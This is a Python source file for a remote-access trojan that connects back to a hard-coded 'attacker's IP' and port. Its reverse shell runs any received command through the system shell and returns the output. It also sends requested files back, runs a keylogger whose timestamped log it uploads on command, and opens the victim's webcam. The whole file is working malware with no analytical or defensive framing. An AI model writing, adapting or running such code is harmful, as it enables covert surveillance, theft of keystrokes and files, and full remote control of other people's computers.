import socket
import subprocess
from pynput.keyboard import Listener, Key
import cv2 as cv
import threading
import time

RHOST = "192.168.1.11"  # Attacker's IP address
RPORT = 9001             # Listener port

# Creating the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Function to capture the camera
def cam():
    try:
        camera = cv.VideoCapture(0)  # Try to access the default camera (0)
        if not camera.isOpened():  # Check if the camera was opened successfully
            raise Exception("Camera not found or is unavailable.")
        
        running = True

        while running:
            status, frame = camera.read()  # Try to read the frame from the camera
            if not status:
                raise Exception("Error capturing video.")

            # Display the camera image
            cv.imshow("Camera", frame)

            # Interrupt the capture when the 'q' key is pressed
            if cv.waitKey(1) & 0xFF == ord('q'):
                running = False

        camera.release()  # Release the camera after use
        cv.destroyAllWindows()  # Close the display windows
    except Exception as e:
        error_message = f"Error: {str(e)}"  # Error message
        s.send(error_message.encode())  # Send the error message to the attacker

# Function to simulate the behavior of the 'cat' command
def cat(filename):
    try:
        with open(filename, 'r') as file:
            content = file.read()  # Read the content of the file
            s.send(content.encode())  # Send the file content to the attacker
    except FileNotFoundError:
        s.send(f"Error: {filename} not found.".encode())  # Send an error if the file doesn't exist

# Function to capture key presses
def keylogger():
    # Function to generate a timestamp
    def get_timestamp():
        return time.strftime("%Y-%m-%d %H:%M:%S")  # Formatted date and time

    # Function called when a key is pressed
    def on_press(key):
        timestamp = get_timestamp()  # Generate the timestamp
        try:
            # Check if the pressed key is a space
            if key == Key.space:
                key = ' '  # Replace the space with the string ' '

            # Log the pressed key to the log file with the timestamp
            with open('logs.txt', 'a') as log:
                log.write(f"{timestamp} - Key pressed: {key}\n")

        except AttributeError:
            # If a special key is pressed (like shift, ctrl, etc.)
            with open('logs.txt', 'a') as log:
                log.write(f"{timestamp} - Special key: [{key}]\n")

    # Function called when a key is released
    def on_release(key):
        timestamp = get_timestamp()  # Generate the timestamp
        with open('logs.txt', 'a') as log:
            log.write(f"{timestamp} - Key released: {key}\n")

        # Stop listening if the ESC key is pressed
        if key == Key.esc:
            return False

    # Start the listener to capture pressed and released keys
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Keep the listener active until stopped

# Function to send the content of the log file
def send_log():
    try:
        with open('logs.txt', 'r') as log_file:
            log_data = log_file.read()  # Read the log file content
            s.send(log_data.encode())  # Send the content to the attacker
    except FileNotFoundError:
        s.send("Log file not found.".encode())  # If the log file doesn't exist

# Function to run the reverse shell
def reverse_shell():
    while True:
        # Receive command from the attacker
        command = s.recv(1024).decode().strip()

        if command.lower() == "showcam":
            # Start the camera capture function in a daemon thread
            threading.Thread(target=cam, daemon=True).start()

        elif command.lower() == "keylogger":
            # Start the keylogger function in a daemon thread
            threading.Thread(target=keylogger, daemon=True).start()

        elif command.lower() == "getlogs":
            # Send the log file content to the attacker
            send_log()

        elif command.lower().startswith("cat "):
            # Extract the filename after the 'cat' command
            filename = command[4:]  # Skip the 'cat ' part
            # Send the file content to the attacker
            cat(filename)

        elif command.lower() == "exit":
            break  # Exit if the attacker types "exit"

        else:
            # Execute the command in the OS
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = proc.communicate()

            # Send the command output back to the attacker
            s.send(output.encode() + error.encode())

    s.close()

# Execute the reverse shell
reverse_shell()
